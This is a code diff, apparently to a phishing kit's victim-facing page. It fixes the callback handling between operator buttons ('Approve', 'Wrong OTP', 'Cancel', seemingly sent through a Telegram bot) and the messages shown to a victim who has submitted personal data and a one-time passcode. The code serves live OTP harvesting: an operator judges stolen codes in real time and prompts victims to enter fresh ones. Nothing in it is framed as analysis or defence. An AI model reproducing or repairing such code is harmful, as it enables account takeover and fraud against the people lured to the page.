@@ -357,6 +357,7 @@
             // Stop both polling intervals
             if (pollInterval1) clearInterval(pollInterval1);
             if (pollInterval2) clearInterval(pollInterval2);
+            if (pollInterval3) clearInterval(pollInterval3);
 
             spinnerOverlay.style.display = 'none';
             resultOverlay.style.display = 'flex';
@@ -364,7 +365,7 @@
             const parts = callbackData.split('_');
             if (parts[0] === 'approve') {
                 resultMessage.textContent = 'Your data has been approved. You will receive a confirmation message within 15 minutes. Thank you.';
-            } else if (parts[0] === 'Wrong OTP') {
+            } else if (parts[0] === 'wrongOTP') {
                 resultMessage.textContent = 'Invalid or Expired OTP. Please try again and put the correct OTP.';
             } else if (parts[0] === 'cancel') {
                 resultMessage.textContent = 'Please reapply and ensure that your information is correct. Thank you.';
@@ -430,8 +431,8 @@
                         text: '✅ Approve',
                         callback_data: 'approve_' + currentTimestamp
                     },  {
-                        text: '♂️ Wrong OTP',
-                        callback_data: 'wrong OTP_' + currentTimestamp
+                        text: '♂️ wrongOTP',
+                        callback_data: 'wrongOTP_' + currentTimestamp
                     },  {
                         text: '❌ Cancel',
                         callback_data: 'cancel_' + currentTimestamp
